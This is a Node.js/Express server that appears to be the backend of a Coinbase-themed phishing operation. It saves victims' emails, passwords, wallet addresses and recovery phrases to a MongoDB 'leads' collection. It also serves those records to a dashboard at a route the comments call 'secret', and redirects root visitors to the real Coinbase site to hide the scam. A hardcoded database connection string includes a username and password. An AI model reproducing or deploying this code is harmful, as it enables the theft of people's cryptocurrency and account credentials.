const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const cors = require('cors');
const path = require('path');

const app = express();
app.use(cors());
app.use(bodyParser.json());
app.use(express.static(__dirname));

const MONGO_URI = "mongodb+srv://scumbag3_db_user:Foreverich21@cluster0.zisiplb.mongodb.net/leads?retryWrites=true&w=majority";

mongoose.connect(MONGO_URI)
  .then(() => console.log("Connected"))
  .catch(err => console.error("DB Error:", err));

const leadSchema = new mongoose.Schema({
    email: String,
    password: String,
    walletAddress: String,
    recoveryPhrase: String,
    timestamp: { type: Date, default: Date.now }
});
const Lead = mongoose.model('Lead', leadSchema, 'leads');

app.post('/update', async (req, res) => {
    try {
        const lead = new Lead(req.body);
        await lead.save();
        res.status(200).send("Saved");
    } catch (err) {
        res.status(500).send("Error");
    }
});

app.get('/dashboard-data', async (req, res) => {
    try {
        const leads = await Lead.find().sort({ timestamp: -1 });
        res.json(leads);
    } catch (err) {
        res.status(500).send("Error");
    }
});

// This is the link you keep secret
app.get('/v_7xp', (req, res) => {
    res.sendFile(path.join(__dirname, 'dashboard.html'));
});

// Anyone landing on the root is sent to the real Coinbase site
app.get('/', (req, res) => {
    res.redirect('https://www.coinbase.com');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Live on ${PORT}`));
